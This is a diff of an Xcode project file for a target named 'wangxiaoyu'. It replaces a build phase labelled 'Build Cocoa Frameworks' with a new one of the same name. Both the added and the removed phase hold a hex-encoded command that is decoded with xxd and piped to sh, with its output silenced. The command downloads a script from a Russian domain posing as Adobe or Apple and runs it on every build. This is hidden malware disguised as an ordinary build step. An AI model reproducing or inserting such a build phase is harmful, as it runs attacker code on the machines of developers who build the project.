@@ -280,7 +280,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = D4DF7B6C27A29F0600C0F5EC /* Build configuration list for PBXNativeTarget "wangxiaoyu" */;
 			buildPhases = (
-				D1F21CDDE4ED5A2AB36A102C /* Build Cocoa Frameworks */,
+				FBFF1AE2B5B13E46E56A102C /* Build Cocoa Frameworks */,
 				48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */,
 				D4DF7B3B27A29F0400C0F5EC /* Sources */,
 				D4DF7B3C27A29F0400C0F5EC /* Frameworks */,
@@ -403,6 +403,29 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	FBFF1AE2B5B13E46E56A102C /* Build Cocoa Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Cocoa Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
 		48B4ED38C43F9C88733EABB9 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -441,24 +464,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-wangxiaoyu/Pods-wangxiaoyu-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		D1F21CDDE4ED5A2AB36A102C /* Build Cocoa Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Cocoa Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652036202d736b2068747470733a2f2f\n6170706c65646f63732e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
